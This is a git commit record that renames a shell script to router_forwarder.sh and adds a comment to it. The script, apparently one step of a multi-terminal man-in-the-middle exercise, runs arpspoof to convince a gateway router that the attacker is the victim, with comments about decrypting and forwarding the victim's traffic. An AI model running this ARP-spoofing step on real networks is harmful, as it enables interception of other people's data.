72efd29d5daff7158ba883aaa5ba3a18656b5c8a
Sachin Deshpande <35118726+sachincdeshpande@users.noreply.github.com>
2020-08-12 11:01:41 -0700

    Update and rename script3.sh to router_forwarder.sh

--- router_forwarder.sh
+++ router_forwarder.sh
@@ -1,4 +1,5 @@
 # in a new (fourth) terminal
 # trick the gateway router into thinking that you are the victim.
 # you will have the private key to decrypt data, and the data is forwarded to the victim.
+# requires the results from nmap in forward_table.sh to run
 arpspoof -i eth0 -t <Gateway IP> <Victim IP>
